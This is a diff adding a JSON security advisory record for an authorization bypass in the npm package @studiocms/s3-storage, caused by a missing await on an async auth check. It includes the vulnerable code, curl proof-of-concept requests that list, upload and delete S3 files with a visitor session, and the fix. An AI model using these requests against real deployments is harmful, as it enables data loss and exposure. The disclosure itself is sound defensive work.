@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-03-12T14:49:31Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@studiocms/s3-storage"
+  },
+  "Advisory": {
+    "DatabaseId": 342203,
+    "Id": "GSA_kwCzR0hTQS1tbTc4LWZncTgtNnBncs4ABTi7",
+    "GhsaId": "GHSA-mm78-fgq8-6pgr",
+    "References": [
+      {
+        "Url": "https://github.com/withstudiocms/studiocms/security/advisories/GHSA-mm78-fgq8-6pgr"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32101"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-mm78-fgq8-6pgr"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-mm78-fgq8-6pgr"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-32101"
+      }
+    ],
+    "Description": "## Summary\n\nThe S3 storage manager's `isAuthorized()` function is declared `async` (returns `Promise\u003cboolean\u003e`) but is called without `await` in both the POST and PUT handlers. Since a Promise object is always truthy in JavaScript, `!isAuthorized(type)` always evaluates to `false`, completely bypassing the authorization check. Any authenticated user with the lowest `visitor` role can upload, delete, rename, and list all files in the S3 bucket.\n\n## Details\n\nThe `isAuthorized` function is typed as returning `Promise\u003cboolean\u003e` in `packages/studiocms/src/handlers/storage-manager/definitions.ts:88`:\n\n```typescript\nexport type ParsedContext = {\n    getJson: () =\u003e Promise\u003cContextJsonBody\u003e;\n    getArrayBuffer: () =\u003e Promise\u003cArrayBuffer\u003e;\n    getHeader: (name: string) =\u003e string | null;\n    isAuthorized: (type?: AuthorizationType) =\u003e Promise\u003cboolean\u003e;  // async\n};\n```\n\nBoth context drivers implement it as `async` — `packages/studiocms/src/handlers/storage-manager/core/effectify-astro-context.ts:32`:\n\n```typescript\nisAuthorized: async (type) =\u003e {\n    switch (type) {\n        case 'headers': {\n            // ... token verification ...\n            const isEditor = level \u003e= UserPermissionLevel.editor;\n            if (!isEditor) return false;\n            return true;\n        }\n        default: {\n            const isEditor = locals.StudioCMS.security?.userPermissionLevel.isEditor || false;\n            return isEditor;\n        }\n    }\n},\n```\n\nBut in the S3 storage manager, it's called without `await` — `packages/@studiocms/s3-storage/src/s3-storage-manager.ts:200`:\n\n```typescript\nif (authRequiredActions.includes(jsonBody.action) \u0026\u0026 !isAuthorized(type)) {\n    return { data: { error: 'Unauthorized' }, status: 401 };\n}\n```\n\nAnd again at line 372 (PUT handler):\n\n```typescript\nif (!isAuthorized(type)) {\n    return { data: { error: 'Unauthorized' }, status: 401 };\n}\n```\n\n`isAuthorized(type)` returns a `Promise` object. `!Promise{...}` is always `false` because a Promise is truthy. The 401 response is never returned.\n\n**Execution flow:**\n1. Visitor-role user sends POST to `/studiocms_api/integrations/storage/manager`\n2. `AstroLocalsMiddleware` verifies session exists — passes (visitor is logged in)\n3. Handler calls `!isAuthorized('locals')` → evaluates `!Promise{...}` = `false`\n4. Authorization check is skipped entirely\n5. Visitor performs the requested storage operation\n\n## PoC\n\n```bash\n# 1. Log in as a visitor-role user and obtain session cookie\n\n# 2. List all files in S3 bucket (should require editor+)\ncurl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=\u003cvisitor-session-token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"list\",\"prefix\":\"\"}'\n\n# Expected: 401 Unauthorized\n# Actual: 200 with full bucket listing\n\n# 3. Upload a file as visitor (should require editor+)\ncurl -X PUT 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=\u003cvisitor-session-token\u003e' \\\n  -H 'Content-Type: application/octet-stream' \\\n  -H 'x-storage-key: malicious/payload.html' \\\n  --data-binary '\u003ch1\u003eUploaded by visitor\u003c/h1\u003e'\n\n# Expected: 401 Unauthorized\n# Actual: 200 File uploaded\n\n# 4. Delete a file as visitor (should require editor+)\ncurl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=\u003cvisitor-session-token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"delete\",\"key\":\"important/document.pdf\"}'\n\n# Expected: 401 Unauthorized\n# Actual: 200 File deleted\n```\n\n## Impact\n\n- Any authenticated visitor gains full S3 storage management (upload, delete, rename, list) — capabilities restricted to editor role and above\n- Attacker can delete arbitrary files from the S3 bucket, causing data loss\n- Attacker can list all files and generate presigned download URLs, exposing all stored content\n- Attacker can upload arbitrary files or rename existing ones, replacing legitimate content with malicious payloads\n\n## Recommended Fix\n\nAdd `await` to both `isAuthorized()` calls in `packages/@studiocms/s3-storage/src/s3-storage-manager.ts`:\n\n```typescript\n// POST handler (line 200) — before:\nif (authRequiredActions.includes(jsonBody.action) \u0026\u0026 !isAuthorized(type)) {\n\n// After:\nif (authRequiredActions.includes(jsonBody.action) \u0026\u0026 !(await isAuthorized(type))) {\n\n// PUT handler (line 372) — before:\nif (!isAuthorized(type)) {\n\n// After:\nif (!(await isAuthorized(type))) {\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-12T14:49:30Z",
+    "Severity": "HIGH",
+    "Summary": "StudioCMS S3 Storage Manager Authorization Bypass via Missing `await` on Async Auth Check",
+    "UpdatedAt": "2026-03-12T14:49:31Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.3.1"
+      },
+      "VulnerableVersionRange": "\u003c= 0.3.0"
+    }
+  ]
+}
